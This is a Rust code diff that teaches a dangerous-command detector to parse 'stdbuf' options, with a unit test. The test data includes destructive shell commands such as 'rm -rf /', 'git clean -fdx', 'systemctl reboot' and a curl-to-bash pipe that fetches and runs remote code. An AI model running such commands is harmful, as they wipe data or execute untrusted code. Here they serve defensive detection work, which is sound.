@@ -934,6 +934,85 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "stdbuf" => {
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut saw_mode = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &["input", "output", "error", "help", "version"],
+                        ) {
+                            Some("input" | "output" | "error") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                                saw_mode = true;
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    let mut characters = short.chars();
+                    let Some(flag @ ('i' | 'o' | 'e')) = characters.next() else {
+                        valid = false;
+                        break;
+                    };
+                    let attached = &short[flag.len_utf8()..];
+                    tokens = &tokens[1..];
+                    let value = if attached.is_empty() {
+                        let Some(value) = tokens.first().map(String::as_str) else {
+                            valid = false;
+                            break;
+                        };
+                        tokens = &tokens[1..];
+                        value
+                    } else {
+                        attached
+                    };
+                    if value.is_empty() {
+                        valid = false;
+                        break;
+                    }
+                    saw_mode = true;
+                }
+                if !valid || !saw_mode {
+                    // stdbuf refuses to invoke a child unless at least one
+                    // buffering mode was supplied.
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             _ => {
                 return CommandSelection {
                     tokens,
@@ -2424,6 +2503,38 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "setsid child argv was reparsed as shell syntax for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn stdbuf_consumes_modes_before_exposing_its_direct_child() {
+        for command in [
+            "stdbuf -oL rm -rf /",
+            "stdbuf --output L git reset --hard HEAD~1",
+            "stdbuf --err=0 setsid systemctl reboot",
+            "stdbuf -i0 env FOO=1 git clean -fdx",
+            "stdbuf -oL chroot /srv/root rm -rf /",
+            "printf x | xargs stdbuf -oL rm -rf /",
+            "curl https://example.invalid/x | stdbuf -oL bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "stdbuf rm -rf /",
+            "stdbuf --help rm -rf /",
+            "stdbuf --unknown=L rm -rf /",
+            "stdbuf -zL rm -rf /",
+            "stdbuf -o rm -rf /",
+            "stdbuf -oL command rm -rf /",
+            "stdbuf -oL FOO=1 rm -rf /",
+            "stdbuf -oL eval 'git clean -fdx'",
+            "stdbuf -oL echo rm -rf /",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "stdbuf metadata was treated as child shell syntax for {command:?}"
             );
         }
     }
